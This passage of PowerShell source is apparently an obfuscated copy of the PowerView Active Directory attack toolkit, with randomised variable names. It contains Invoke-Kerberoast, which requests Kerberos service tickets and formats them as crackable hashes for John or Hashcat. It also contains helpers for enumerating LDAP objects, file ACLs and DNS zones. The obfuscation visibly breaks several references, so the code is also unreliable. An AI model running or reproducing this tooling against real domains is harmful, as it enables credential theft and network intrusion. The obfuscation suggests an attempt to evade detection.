                        $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'TicketByteHexStream' $qYFR5PCZruUkdna9T
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($OR011dUVA4482EOcyVY1.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $RvbGOdce324ca7APK3 = $qYFR5PCZruUkdna9T
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($SvrBnkyJd).Replace('-',''))
                }

                if($RvbGOdce324ca7APK3) {
                    
                    if ($lf6IXxnozrHwY5j -match 'John') {
                        $Gk7N79Y = "`$Vua0bikU53`$$($OR011dUVA4482EOcyVY1.ServicePrincipalName):$RvbGOdce324ca7APK3"
                    }
                    else {
                        if ($Tm17BPMwz8VWplgQ2h -ne 'UNKNOWN') {
                            $hZmS = $Tm17BPMwz8VWplgQ2h.SubString($Tm17BPMwz8VWplgQ2h.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $hZmS = 'UNKNOWN'
                        }

                        
                        $Gk7N79Y = "`$Vua0bikU53`$$($Sbry3cNYIldxTQjq)`$*$2`$$hZmS`$$($OR011dUVA4482EOcyVY1.ServicePrincipalName)*`$$RvbGOdce324ca7APK3"
                    }
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'Hash' $Gk7N79Y
                }

                $TxOjsKu13lUSJ8MHybpYNF.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $TxOjsKu13lUSJ8MHybpYNF
            }
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Invoke-Kerberoast {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $lf6IXxnozrHwY5j = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ogjQd7VXw4PS0fCM5yLTDnlcY = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['Credential']) {
            $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $ogjQd7VXw4PS0fCM5yLTDnlcY['Identity'] = $S }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -lf6IXxnozrHwY5j $lf6IXxnozrHwY5j
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Get-PathAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $a9LvymtQdGPNr8cqgsI,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            
            [CmdletBinding()]
            Param(
                [Int]
                $X1E2
            )

            $KmbRr = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $45nyXzopp = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $MgE7vS2Rr0OmJKGNTrAr0wkA = @()

            
            $MgE7vS2Rr0OmJKGNTrAr0wkA += $45nyXzopp.Keys | ForEach-Object {
                              if (($X1E2 -band $_) -eq $_) {
                                $45nyXzopp[$_]
                                $X1E2 = $X1E2 -band (-not $_)
                              }
                            }

            
            $MgE7vS2Rr0OmJKGNTrAr0wkA += $KmbRr.Keys | Where-Object { $X1E2 -band $_ } | ForEach-Object { $KmbRr[$_] }
            ($MgE7vS2Rr0OmJKGNTrAr0wkA | Where-Object {$_}) -join ','
        }

        $HX6YyAJzhvK1VrW = @{}
        if ($PSBoundParameters['Credential']) { $HX6YyAJzhvK1VrW['Credential'] = $3ezVSfm6f4k }

        $vF = @{}
    }

    PROCESS {
        ForEach ($XhfGVE in $a9LvymtQdGPNr8cqgsI) {
            try {
                if (($XhfGVE -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $7GPfL6B = (New-Object System.Uri($XhfGVE)).Host
                    if (-not $vF[$7GPfL6B]) {
                        
                        Add-RemoteConnection -mA $7GPfL6B -3ezVSfm6f4k $3ezVSfm6f4k
                        $vF[$7GPfL6B] = $True
                    }
                }

                $JlWqeGpYS = Get-Acl -a9LvymtQdGPNr8cqgsI $XhfGVE

                $JlWqeGpYS.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $1BiVCFT4DJPApcdlRH = $_.IdentityReference.Value
                    $TwsV1 = ConvertFrom-SID -iQFdt $1BiVCFT4DJPApcdlRH @ConvertArguments

                    $TxOjsKu13lUSJ8MHybpYNF = New-Object PSObject
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'Path' $XhfGVE
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'IdentityReference' $TwsV1
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'IdentitySID' $1BiVCFT4DJPApcdlRH
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $TxOjsKu13lUSJ8MHybpYNF.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $TxOjsKu13lUSJ8MHybpYNF
                }
            }
            catch {
                Write-Verbose "[Get-PathAcl] error: $_"
            }
        }
    }

    END {
        
        $vF.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $UtHQ
    )

    $HdwkM6u9Qz4cxeONFJY2hfpg = @{}

    $UtHQ.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                
                $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = $UtHQ[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = $UtHQ[$_][0] -as $lDPecSvGL3yM6xw2
            }
            elseif ($_ -eq 'samaccounttype') {
                $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = $UtHQ[$_][0] -as $JKQhSPcAIG
            }
            elseif ($_ -eq 'objectguid') {
                
                $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = (New-Object Guid (,$UtHQ[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = $UtHQ[$_][0] -as $KLrjblEyzposuH
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                
                $ZlEM3FVAjYHyCG6L = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $UtHQ[$_][0], 0
                if ($ZlEM3FVAjYHyCG6L.Owner) {
                    $HdwkM6u9Qz4cxeONFJY2hfpg['Owner'] = $ZlEM3FVAjYHyCG6L.Owner
                }
                if ($ZlEM3FVAjYHyCG6L.Group) {
                    $HdwkM6u9Qz4cxeONFJY2hfpg['Group'] = $ZlEM3FVAjYHyCG6L.Group
                }
                if ($ZlEM3FVAjYHyCG6L.DiscretionaryAcl) {
                    $HdwkM6u9Qz4cxeONFJY2hfpg['DiscretionaryAcl'] = $ZlEM3FVAjYHyCG6L.DiscretionaryAcl
                }
                if ($ZlEM3FVAjYHyCG6L.SystemAcl) {
                    $HdwkM6u9Qz4cxeONFJY2hfpg['SystemAcl'] = $ZlEM3FVAjYHyCG6L.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($UtHQ[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = "NEVER"
                }
                else {
                    $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = [datetime]::fromfiletime($UtHQ[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                
                if ($UtHQ[$_][0] -is [System.MarshalByRefObject]) {
                    
                    $oQcVuwRs2DTWSX1 = $UtHQ[$_][0]
                    [Int32]$atu1Yx0Co2frSmNZGh46 = $oQcVuwRs2DTWSX1.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $qYFR5PCZruUkdna9T, $oQcVuwRs2DTWSX1, $qYFR5PCZruUkdna9T)
                    [Int32]$vyQ2yxFZh9uvRekPjG  = $oQcVuwRs2DTWSX1.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $qYFR5PCZruUkdna9T, $oQcVuwRs2DTWSX1, $qYFR5PCZruUkdna9T)
                    $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $atu1Yx0Co2frSmNZGh46, $vyQ2yxFZh9uvRekPjG)))
                }
                else {
                    
                    $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = ([datetime]::FromFileTime(($UtHQ[$_][0])))
                }
            }
            elseif ($UtHQ[$_][0] -is [System.MarshalByRefObject]) {
                
                $bJDXcf = $UtHQ[$_]
                try {
                    $oQcVuwRs2DTWSX1 = $bJDXcf[$_][0]
                    [Int32]$atu1Yx0Co2frSmNZGh46 = $oQcVuwRs2DTWSX1.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $qYFR5PCZruUkdna9T, $oQcVuwRs2DTWSX1, $qYFR5PCZruUkdna9T)
                    [Int32]$vyQ2yxFZh9uvRekPjG  = $oQcVuwRs2DTWSX1.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $qYFR5PCZruUkdna9T, $oQcVuwRs2DTWSX1, $qYFR5PCZruUkdna9T)
                    $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = [Int64]("0x{0:x8}{1:x8}" -f $atu1Yx0Co2frSmNZGh46, $vyQ2yxFZh9uvRekPjG)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = $bJDXcf[$_]
                }
            }
            elseif ($UtHQ[$_].count -eq 1) {
                $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = $UtHQ[$_][0]
            }
            else {
                $HdwkM6u9Qz4cxeONFJY2hfpg[$_] = $UtHQ[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $HdwkM6u9Qz4cxeONFJY2hfpg
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}








function Get-DomainSearcher {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [String]
        $WlQJd,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7 = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $l6OxARucBpbqH124jLlwS = $3Ecdwi8qNy

            if ($8MSydlAwkKhVgnu4Ls10:USERDNSDOMAIN -and ($8MSydlAwkKhVgnu4Ls10:USERDNSDOMAIN.Trim() -ne '')) {
                
                $hZmS = $8MSydlAwkKhVgnu4Ls10:USERDNSDOMAIN
                if ($8MSydlAwkKhVgnu4Ls10:LOGONSERVER -and ($8MSydlAwkKhVgnu4Ls10:LOGONSERVER.Trim() -ne '') -and $hZmS) {
                    $9XGIcI = "$($8MSydlAwkKhVgnu4Ls10:LOGONSERVER -replace '\\','').$hZmS"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            
            $iNorTLzVRlYhxVs5d5 = Get-3Ecdwi8qNy -3ezVSfm6f4k $3ezVSfm6f4k
            $9XGIcI = ($iNorTLzVRlYhxVs5d5.PdcRoleOwner).Name
            $l6OxARucBpbqH124jLlwS = $iNorTLzVRlYhxVs5d5.Name
        }
        elseif ($8MSydlAwkKhVgnu4Ls10:USERDNSDOMAIN -and ($8MSydlAwkKhVgnu4Ls10:USERDNSDOMAIN.Trim() -ne '')) {
            
            $l6OxARucBpbqH124jLlwS = $8MSydlAwkKhVgnu4Ls10:USERDNSDOMAIN
            if ($8MSydlAwkKhVgnu4Ls10:LOGONSERVER -and ($8MSydlAwkKhVgnu4Ls10:LOGONSERVER.Trim() -ne '') -and $l6OxARucBpbqH124jLlwS) {
                $9XGIcI = "$($8MSydlAwkKhVgnu4Ls10:LOGONSERVER -replace '\\','').$l6OxARucBpbqH124jLlwS"
            }
        }
        else {
            
            write-verbose "get-3Ecdwi8qNy"
            $iNorTLzVRlYhxVs5d5 = Get-3Ecdwi8qNy
            $9XGIcI = ($iNorTLzVRlYhxVs5d5.PdcRoleOwner).Name
            $l6OxARucBpbqH124jLlwS = $iNorTLzVRlYhxVs5d5.Name
        }

        if ($PSBoundParameters['Server']) {
            
            $9XGIcI = $Gkd0Hz5f
        }

        $A2fgrf7 = 'LDAP://'

        if ($9XGIcI -and ($9XGIcI.Trim() -ne '')) {
            $A2fgrf7 += $9XGIcI
            if ($l6OxARucBpbqH124jLlwS) {
                $A2fgrf7 += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $A2fgrf7 += $WlQJd + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($h2yNsAt -Match '^GC://') {
                
                $Is3MHqRhWXOH = $h2yNsAt.ToUpper().Trim('/')
                $A2fgrf7 = ''
            }
            else {
                if ($h2yNsAt -match '^LDAP://') {
                    if ($h2yNsAt -match "LDAP://.+/.+") {
                        $A2fgrf7 = ''
                        $Is3MHqRhWXOH = $h2yNsAt
                    }
                    else {
                        $Is3MHqRhWXOH = $h2yNsAt.SubString(7)
                    }
                }
                else {
                    $Is3MHqRhWXOH = $h2yNsAt
                }
            }
        }
        else {
            
            if ($l6OxARucBpbqH124jLlwS -and ($l6OxARucBpbqH124jLlwS.Trim() -ne '')) {
                $Is3MHqRhWXOH = "DC=$($l6OxARucBpbqH124jLlwS.Replace('.', ',DC='))"
            }
        }

        $A2fgrf7 += $Is3MHqRhWXOH
        Write-Verbose "[Get-DomainSearcher] search base: $A2fgrf7"

        if ($3ezVSfm6f4k -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            
            $iNorTLzVRlYhxVs5d5 = New-Object DirectoryServices.DirectoryEntry($A2fgrf7, $3ezVSfm6f4k.UserName, $3ezVSfm6f4k.GetNetworkCredential().Password)
            $lW1SUjy = New-Object System.DirectoryServices.DirectorySearcher($iNorTLzVRlYhxVs5d5)
        }
        else {
            
            $lW1SUjy = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$A2fgrf7)
        }

        $lW1SUjy.PageSize = $dTP7Qv6RslNUx
        $lW1SUjy.SearchScope = $9xBkgsU80TdhW6XNGqtnDA7
        $lW1SUjy.CacheResults = $False
        $lW1SUjy.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $lW1SUjy.ServerTimeLimit = $OVoMgsOXRJJ7
        }

        if ($PSBoundParameters['Tombstone']) {
            $lW1SUjy.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $lW1SUjy.filter = $c7rZO2V9
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $lW1SUjy.SecurityMasks = Switch ($Z8qdyPlzVkp4RigJ71) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            
            $5D9XKpeVqNUDxyQsskuuPKkrV = $UtHQ| ForEach-Object { $_.Split(',') }
            $qYFR5PCZruUkdna9T = $lW1SUjy.PropertiesToLoad.AddRange(($5D9XKpeVqNUDxyQsskuuPKkrV))
        }

        $lW1SUjy
    }
}


function Convert-ZKHt4xveu8MJ {


    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $ZKHt4xveu8MJ
    )

    BEGIN {
        function Get-TwsV1 {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $VcZPt
            )

            [Int]$I31oLbflgVHJGZxEm = $VcZPt[0]
            [Int]$f9nUPLkwgmvHxa2dXM = $VcZPt[1]
            [Int]$hwT =  2
            [String]$TwsV1  = ''

            while ($f9nUPLkwgmvHxa2dXM-- -gt 0)
            {
                [Int]$Yrk5U32 = $VcZPt[$hwT++]
                while ($Yrk5U32-- -gt 0) {
                    $TwsV1 += [Char]$VcZPt[$hwT++]
                }
                $TwsV1 += "."
            }
            $TwsV1
        }
    }

    PROCESS {
        
        $49Y = [BitConverter]::ToUInt16($ZKHt4xveu8MJ, 2)
        $qFO6Lscl = [BitConverter]::ToUInt32($ZKHt4xveu8MJ, 8)

        $opwlQqvwbkQveE9S9rElL76X = $ZKHt4xveu8MJ[12..15]

        
        $qYFR5PCZruUkdna9T = [array]::Reverse($opwlQqvwbkQveE9S9rElL76X)
        $4ghnTosU2Z79 = [BitConverter]::ToUInt32($opwlQqvwbkQveE9S9rElL76X, 0)

        $u4mNcPDnZUAFE61kCq = [BitConverter]::ToUInt32($ZKHt4xveu8MJ, 20)
        if ($u4mNcPDnZUAFE61kCq -ne 0) {
            $Delbfea7bKTOBJnjwc1UolIr = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($u4mNcPDnZUAFE61kCq)).ToString()
        }
        else {
            $Delbfea7bKTOBJnjwc1UolIr = '[static]'
        }

        $S = New-Object PSObject

        if ($49Y -eq 1) {
            $H6aVO4thho = "{0}.{1}.{2}.{3}" -f $ZKHt4xveu8MJ[24], $ZKHt4xveu8MJ[25], $ZKHt4xveu8MJ[26], $ZKHt4xveu8MJ[27]
            $pfZYxiTwheudmy = $H6aVO4thho
            $S | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($49Y -eq 2) {
            $NPUcN4JqfKpq8Wp = Get-TwsV1 $ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]
            $pfZYxiTwheudmy = $NPUcN4JqfKpq8Wp
            $S | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($49Y -eq 5) {
            $32MgN = Get-TwsV1 $ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]
            $pfZYxiTwheudmy = $32MgN
            $S | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($49Y -eq 6) {
            
            $pfZYxiTwheudmy = $([System.Convert]::ToBase64String($ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]))
            $S | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($49Y -eq 12) {
            $IXCTq = Get-TwsV1 $ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]
            $pfZYxiTwheudmy = $IXCTq
            $S | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($49Y -eq 13) {
            
            $pfZYxiTwheudmy = $([System.Convert]::ToBase64String($ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]))
            $S | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($49Y -eq 15) {
            
            $pfZYxiTwheudmy = $([System.Convert]::ToBase64String($ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]))
            $S | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($49Y -eq 16) {
            [string]$ePaue4kTD2L1p4zvg  = ''
            [int]$Yrk5U32 = $ZKHt4xveu8MJ[24]
            $hwT = 25

            while ($Yrk5U32-- -gt 0) {
                $ePaue4kTD2L1p4zvg += [char]$ZKHt4xveu8MJ[$hwT++]
            }

            $pfZYxiTwheudmy = $ePaue4kTD2L1p4zvg
            $S | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($49Y -eq 28) {
            
            $pfZYxiTwheudmy = $([System.Convert]::ToBase64String($ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]))
            $S | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($49Y -eq 33) {
            
            $pfZYxiTwheudmy = $([System.Convert]::ToBase64String($ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]))
            $S | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $pfZYxiTwheudmy = $([System.Convert]::ToBase64String($ZKHt4xveu8MJ[24..$ZKHt4xveu8MJ.length]))
            $S | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $S | Add-Member Noteproperty 'UpdatedAtSerial' $qFO6Lscl
        $S | Add-Member Noteproperty 'TTL' $4ghnTosU2Z79
        $S | Add-Member Noteproperty 'Age' $u4mNcPDnZUAFE61kCq
        $S | Add-Member Noteproperty 'TimeStamp' $Delbfea7bKTOBJnjwc1UolIr
        $S | Add-Member Noteproperty 'Data' $pfZYxiTwheudmy
        $S
    }
}


function Get-DomainDNSZone {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $wtWPex5R = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $RyorkXRAWEMqCS8p8et = Get-DomainSearcher @SearcherArguments

        if ($RyorkXRAWEMqCS8p8et) {
            if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $RyorkXRAWEMqCS8p8et.FindOne()  }
            else { $nhxRs5G1 = $RyorkXRAWEMqCS8p8et.FindAll() }
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                $TxOjsKu13lUSJ8MHybpYNF = Convert-LDAPProperty -UtHQ $_.Properties
                $TxOjsKu13lUSJ8MHybpYNF | Add-Member NoteProperty 'ZoneName' $TxOjsKu13lUSJ8MHybpYNF.name
                $TxOjsKu13lUSJ8MHybpYNF.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $TxOjsKu13lUSJ8MHybpYNF
            }

            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            $RyorkXRAWEMqCS8p8et.dispose()
        }

        $wtWPex5R['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $nZuH3szIKVoDJF4Q20 = Get-DomainSearcher @SearcherArguments

        if ($nZuH3szIKVoDJF4Q20) {
            try {
